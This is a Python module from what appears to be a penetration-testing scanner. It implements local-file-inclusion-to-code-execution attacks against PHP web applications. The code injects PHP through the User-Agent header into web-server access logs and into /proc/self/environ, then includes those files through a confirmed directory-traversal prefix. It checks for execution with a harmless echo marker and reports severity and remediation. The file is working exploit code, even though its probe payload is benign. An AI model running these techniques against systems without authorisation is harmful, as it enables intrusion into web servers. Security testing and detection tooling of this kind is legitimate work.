"""
LFI -> RCE via log / environ poisoning.

When inclusion is confirmed but PHP wrappers are unavailable, code execution is
often still reachable by writing attacker-controlled PHP into a file the target
will later include:

* **Access-log poisoning** — the ``User-Agent`` (or request line) is written to
  the web-server access log; including that log then executes the injected PHP.
* **/proc/self/environ** — on some stacks the request environment (including a
  poisoned ``User-Agent``) is reachable and executed when included.

Both techniques reuse the exact traversal prefix already confirmed by the
detection stage, so they only fire on genuinely vulnerable targets and verify
execution with a unique marker before reporting.
"""
from __future__ import annotations

import re
import secrets
from typing import Iterator, List, Optional

from lfimachine.core.result import Finding, Severity
from lfimachine.payloads import wordlists
from lfimachine.techniques.base import Technique, TechniqueContext


def _traversal_prefix(ctx: TechniqueContext) -> Optional[str]:
    """Derive the working ``../`` prefix from the confirmed traversal payload."""
    if not ctx.confirmed_traversal:
        return None
    payload = ctx.confirmed_traversal
    # Strip the trailing known file (etc/passwd, windows/win.ini, ...) to leave
    # just the traversal sequence that reaches filesystem root.
    for tail in ("etc/passwd", "etc/hosts", "proc/version",
                 "windows/win.ini", "boot.ini"):
        idx = payload.find(tail)
        if idx != -1:
            return payload[:idx]
    m = re.match(r"^((?:\.{2,}[\\/]+)+)", payload)
    return m.group(1) if m else None


class LogPoisonTechnique(Technique):
    name = "log-poisoning"
    description = "Access-log poisoning to achieve code execution"
    priority = 30
    requires_inclusion = True

    def applicable(self, ctx: TechniqueContext) -> bool:
        return ctx.rce and ctx.confirmed_traversal is not None

    def run(self, ctx: TechniqueContext) -> Iterator[Finding]:
        log = ctx.logger
        prefix = _traversal_prefix(ctx)
        if prefix is None:
            log.verbose(f"[{self.name}] no reusable traversal prefix; skipping")
            return

        marker = "LPX" + secrets.token_hex(4)
        # A minimal, marked probe. `echo` only — no real command is run.
        poison = f"<?php echo '{marker}';?>"

        # Step 1: write the poison into the log via the User-Agent header.
        ctx.point.send_poison = None  # noqa: intentionally unused placeholder
        self._inject(ctx, poison)

        os_name = ctx.os_confirmed or ctx.fingerprint.os or "linux"
        candidates: List[str] = [
            p for p in wordlists.LOG_PATHS
            if (os_name != "windows") == (not p[1:2] == ":")
        ] or wordlists.LOG_PATHS

        for log_path in candidates:
            target = log_path.lstrip("/")
            payload = f"{prefix}{target}"
            resp = ctx.point.send(ctx.client, payload)
            if not resp.ok:
                continue
            if marker in resp.text:
                around = resp.text.split(marker)[0][-40:]
                executed = "<?php" not in around
                log.good(
                    f"Log poisoning {'confirmed' if executed else 'suspected'}: "
                    f"{log_path} on {ctx.point.describe()}"
                )
                yield Finding(
                    technique=self.name,
                    title=f"Remote Code Execution via log poisoning ({log_path})",
                    severity=Severity.CRITICAL if executed else Severity.HIGH,
                    confidence=0.9 if executed else 0.55,
                    url=resp.url or ctx.point.url,
                    parameter=ctx.point.parameter or "<path>",
                    method=ctx.point.method,
                    payload=payload,
                    evidence=f"marker {marker} executed from {log_path}",
                    os_guess=os_name,
                    status_code=resp.status_code,
                    response_length=resp.length,
                    remediation=(
                        "Prevent user input from reaching include paths and "
                        "restrict web-server log readability from the app user."
                    ),
                    extra={"log_file": log_path, "code_exec": executed},
                )
                if ctx.stop_on_first:
                    return

    def _inject(self, ctx: TechniqueContext, poison: str) -> None:
        # Send a normal-looking request whose User-Agent carries the PHP payload.
        try:
            ctx.point.send  # noqa
            # Reuse the injection point but override the UA header for this write.
            ctx.point.base_headers = dict(ctx.point.base_headers)
            ctx.point.base_headers["User-Agent"] = poison
            ctx.point.send(ctx.client, "index")
        finally:
            ctx.point.base_headers.pop("User-Agent", None)


class ProcEnvironTechnique(Technique):
    name = "proc-environ"
    description = "/proc/self/environ poisoning via User-Agent"
    priority = 28
    requires_inclusion = True

    def applicable(self, ctx: TechniqueContext) -> bool:
        os_name = ctx.os_confirmed or ctx.fingerprint.os
        return ctx.rce and ctx.confirmed_traversal is not None and os_name != "windows"

    def run(self, ctx: TechniqueContext) -> Iterator[Finding]:
        log = ctx.logger
        prefix = _traversal_prefix(ctx)
        if prefix is None:
            return
        marker = "PEX" + secrets.token_hex(4)
        poison = f"<?php echo '{marker}';?>"

        ctx.point.base_headers = dict(ctx.point.base_headers)
        ctx.point.base_headers["User-Agent"] = poison
        payload = f"{prefix}proc/self/environ"
        resp = ctx.point.send(ctx.client, payload)
        ctx.point.base_headers.pop("User-Agent", None)

        if resp.ok and marker in resp.text:
            around = resp.text.split(marker)[0][-40:]
            executed = "<?php" not in around
            log.good(
                f"/proc/self/environ {'RCE' if executed else 'disclosure'} "
                f"on {ctx.point.describe()}"
            )
            yield Finding(
                technique=self.name,
                title="Code execution via /proc/self/environ poisoning",
                severity=Severity.CRITICAL if executed else Severity.MEDIUM,
                confidence=0.85 if executed else 0.5,
                url=resp.url or ctx.point.url,
                parameter=ctx.point.parameter or "<path>",
                method=ctx.point.method,
                payload=payload,
                evidence=f"marker {marker} from /proc/self/environ",
                os_guess="linux",
                status_code=resp.status_code,
                response_length=resp.length,
                remediation="Prevent user input from reaching include paths.",
                extra={"code_exec": executed},
            )
